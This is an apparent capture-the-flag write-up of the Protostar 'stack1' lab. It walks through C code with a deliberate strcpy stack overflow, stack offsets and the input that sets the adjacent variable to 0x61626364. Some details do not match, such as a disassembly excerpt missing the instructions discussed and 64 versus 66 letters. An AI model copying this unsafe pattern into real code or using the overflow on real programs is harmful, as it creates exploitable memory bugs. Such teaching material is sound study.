Let's start by looking at the source code of the challenge.

{% highlight c %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
{% endhighlight %}

Firstly, we have a `volatile int modified` variable statement. This statement tells the compiler that it should not optimize it by any means. This means that this variable is open to modify somewhere else during the execution and the compiler is forced to reload the variable every time. Read more at [Wikipedia](https://en.wikipedia.org/wiki/Volatile_(computer_programming)).

After that we're going to copy the contents of `argv[1]` into buffer. Notice how we're using `strcpy()` function that won't care about the size of the destination buffer, we can simply copy 1000 bytes into 64 bytes buffer resulting in buffer overflow. That's why we should be using `strncpy()` function that takes another argument - number of bytes to copy.

In last section of code we have `if(modified == 0x61626364)`. As the `modified` variable is equal to `0` we have to modify it with a previously detected buffer overflow vulnerability. But firstly, let's take a look at the disassembly of this program.

{% highlight assembly %}

0x080484c0 <main+92>:	mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:	mov    eax,0x80485f3
0x080484c9 <main+101>:	mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:	mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:	call   0x8048378 <printf@plt>
0x080484d5 <main+113>:	leave  
0x080484d6 <main+114>:	ret    
{% endhighlight %}

First thing what we can see is that in this line `DWORD PTR [esp+0x5c],0x0`, value `0x0` is moved into stack with offset 0x5c. That's the `modified` variable. At the next arrow we can see `lea    eax,[esp+0x1c]`, so the variable passed to the parameter passed to the function `strcpy()` is located at `esp` plus offset `0x1c`. That's our buffer. We can also check that by substracting both addressed. The difference should be the size of buffer, so 64 bytes.

Let's take a look at this simple stack representation, showing the local variables that are put onto the stack.

{% highlight python %}
>>> 0x5c - 0x1c
64
{% endhighlight %}

![Awesome Buffer Sketch](/img/protostar/awesome-buffer-sketch.jpg){:class="img-responsive center-block"}

If we supply the program with number of elements smaller than 64, then it will run without smallest problem.

{% highlight bash %}
$ ./stack1 aaaa
Try again, you got 0x00000000
{% endhighlight %}

![Awesome Buffer Sketch](/img/protostar/awesome-buffer-not-filled.jpg){:class="img-responsive center-block"}

But what will happen if we overflow the buffer with 2 'A' letters bigger than the allocated size, so in this case 64 'A' letters.

{% highlight python %}
>>> 'A' * 66
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
{% endhighlight %}

{% highlight bash %}
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Try again, you got 0x00004141
{% endhighlight %}

As you can see, our `modified` variable gets overwritten as it's the next variable on the stack.

![Awesome Buffer Sketch](/img/protostar/awesome-buffer-overflowed.jpg){:class="img-responsive center-block"}

Now we have to make sure that this check `modified == 0x61626364` is correct. Firstly let's convert them to characters.

{% highlight python %}
>>> chr(0x61) + chr(0x62) + chr(0x63) + chr(0x64)
'abcd'
{% endhighlight %}

But we have to remeber that values in memory are stored in little endian. Read more [here](https://en.wikipedia.org/wiki/Endianness). Basically we have to revert the values into `dcba`.

{% highlight bash %}
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
{% endhighlight %}
